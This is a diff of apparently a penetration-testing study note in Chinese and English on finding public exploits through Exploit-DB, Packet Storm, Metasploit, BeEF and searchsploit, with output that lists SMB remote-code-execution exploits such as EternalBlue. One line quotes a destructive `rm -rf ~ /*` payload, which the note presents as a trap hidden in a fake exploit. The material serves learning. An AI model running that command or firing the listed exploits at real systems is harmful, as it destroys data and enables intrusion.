@@ -2122,11 +2122,9 @@ Running without configuration file.
 >> `searchConnectorDescription`：設定單個連接器的細節\
 >> `isDefaultSaveLocation`：指定是否將此位置作為預設的儲存位置，設為 true 表示啟用\
 >> `isSupported`：不在官方文檔中，但可以設定為 false，通常用於兼容性處理\
->> `<simpleLocation>` 和 `<url>`：指定遠端資源的位置。在這裡，http://192.168.218.129 是目標的 WebDAV 伺服器 URL。
-
+>> `<simpleLocation>` 和 `<url>`：指定遠端資源的位置。在這裡，http://192.168.218.129 是目標的 WebDAV 伺服器 URL。    
             
-            
-```XML=
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
     <name>@windows.storage.dll,-34582</name>
@@ -2258,4 +2256,161 @@ char jmpcode[] =
 ['rm -rf ~ /* 2> /dev/null &']
 >>>
 ```
-> Malicious SSH exploit payload that will wipe your attacking machine
+> Malicious SSH exploit payload that will wipe your attacking machine\
+> The program would then connect to a public IRC server to announce the user's actions to the world
+             
+>[!Tip]
+> Exploits that are written in a low-level programming language and require compilation are often hosted in both source code and binary format.
+
+### - Online Exploit Resources
+- [The Exploit Database](https://www.exploit-db.com/)\
+It is a free archive of public exploits that are gathered through submissions, mailing lists, and public resources.
+![image](https://hackmd.io/_uploads/ry-WBajrJl.png)
+> `D field`: download exploit file\
+> `A field`: vulnerable application files\
+> `V field`: EDB Verified checkmark\
+> `Type field`: dos, local, remote, or webapp.\
+    
+- [Packet Storm](https://packetstorm.news/)\
+An information security website that provides up-to-date information on security news, exploits, and tools (published tools by security vendors) for educational and testing purposes.
+![image](https://hackmd.io/_uploads/r11UD6jSJx.png)
+    
+- GitHub\
+An online code hosting platform for version control and collaboration.
+    - [Offsec Github](https://github.com/offensive-security)
+    - [CHW Github](https://github.com/chw41) 😎
+    
+- Google Search Operators\
+    searching for exploits using a specific software's version followed by the "exploit" keyword
+    ```
+    ┌──(chw㉿CHW-kali)-[~]
+    └─$ firefox --search "Microsoft Edge site:exploit-db.com"
+    ```
+### - Offline Exploit Resources            
+#### - Exploit Frameworks
+An exploit framework1 is a software package that contains reliable exploits for easy execution against a target.\
+    - [Metasploit](https://github.com/rapid7/metasploit-framework)\
+    [Offsec Msfconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)\
+    免費 community edition 與付費 pro version.\
+        ![image](https://hackmd.io/_uploads/HyPCdynBJx.png)\
+    - [Core Impact](https://www.coresecurity.com/products/core-impact)\
+    Core Impact 是商業工具，需付費。\
+        ![image](https://hackmd.io/_uploads/ByqYj0iSJl.png)\
+    - [Immunity Canvas](https://www.e-spincorp.com/immunity-canvas/)\
+    需購買授權，commercial security assessment tools (SAT) 
+        ![image](https://hackmd.io/_uploads/BysOA0oBJx.png)
+    - [The Browser Exploitation Framework (BeEF)](https://beefproject.com/)\
+    針對瀏覽器漏洞的開源框架，用於針對用戶端進行攻擊\
+        ![image](https://hackmd.io/_uploads/HySq_1nSJg.png)
+
+#### - SearchSploit
+
+The Exploit Database provides a downloadable archived copy of all the hosted exploit code. (default in Kali)
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ sudo apt update && sudo apt install exploitdb
+[sudo] password for kali: 
+...
+The following packages will be upgraded:
+     exploitdb
+...
+Setting up exploitdb (20220526-0kali1) ...
+...   
+```
+Exploit Database archive under `/usr/share/exploitdb/`
+exploits and shellcodes
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ ls -1 /usr/share/exploitdb/ 
+
+┌──(chw㉿CHW-kali)-[~]
+└─$ ls -1 /usr/share/exploitdb/exploits
+aix
+alpha
+android
+arm
+ashx
+asp
+aspx
+atheos
+beos
+bsd
+bsd_x86
+cfm
+cgi
+freebsd
+freebsd_x86
+...
+```
+> These sub-directories are separated based on operating system, architecture, scripting language, etc.
+
+>[!Note]
+> SearchSploit 是 Exploit Database的一部分，提供 local 漏洞資料庫搜尋工具。\
+> `searchsploit <關鍵字>`\
+> `searchsploit -m <Exploit ID>`\
+> `searchsploit -u`: 更新 db
+```
+==========
+Examples 
+==========
+searchsploit afd windows local
+searchsploit -t oracle windows
+searchsploit -p 39446
+searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+searchsploit -s Apache Struts 2.0.0
+searchsploit linux reverse password
+searchsploit -j 55555 | json_pp
+    
+For more examples, see the manual: https://www.exploit-db.com/searchsploit       
+```
+Search for all available remote exploits that target the SMB service on the Windows operating system
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ searchsploit remote smb microsoft windows
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                             | windows/remote/16366.rb
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)   | windows/remote/43970.rb
+Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                        | windows/remote/48537.py
+Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                                       | windows/remote/40280.py
+Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                | windows/remote/14674.txt
+Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                   | windows/remote/16363.rb
+Microsoft Windows - SMB Relay Code Execution (MS08-068) (Metasploit)                                                        | windows/remote/16360.rb
+Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                               | windows/dos/41891.rb
+Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                        | windows/remote/7125.txt
+Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                              | windows/remote/20.txt
+Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                                      | windows/remote/41929.py
+Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution                                                               | windows/remote/44616.py
+Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                            | windows/remote/42031.py
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                        | windows/remote/42315.py     
+```     
+若要修改 exploit，參數 `-m`:
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ searchsploit -m windows/remote/48537.py
+
+  Exploit: Microsoft Windows - 'SMBGhost' Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/48537
+     Path: /usr/share/exploitdb/exploits/windows/remote/48537.py
+File Type: Python script, ASCII text executable, with very long lines (343)
+
+Copied to: /home/kali/48537.py
+    
+┌──(chw㉿CHW-kali)-[~]
+└─$ searchsploit -m 42031
+    Exploit: Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
+      URL: https://www.exploit-db.com/exploits/42031
+     Path: /usr/share/exploitdb/exploits/windows/remote/42031.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/kali/42031.py
+```
+>[!Tip]
+> What is the searchsploit command to search for the following terms: php, webdav, windows?
+> `searchsploit php webdav windows`
+
+![image](https://hackmd.io/_uploads/rJtokZhB1e.png)
+
+#### - Nmap NSE Scripts
+NSE comes with a variety of scripts to enumerate, brute force, fuzz, and detect.
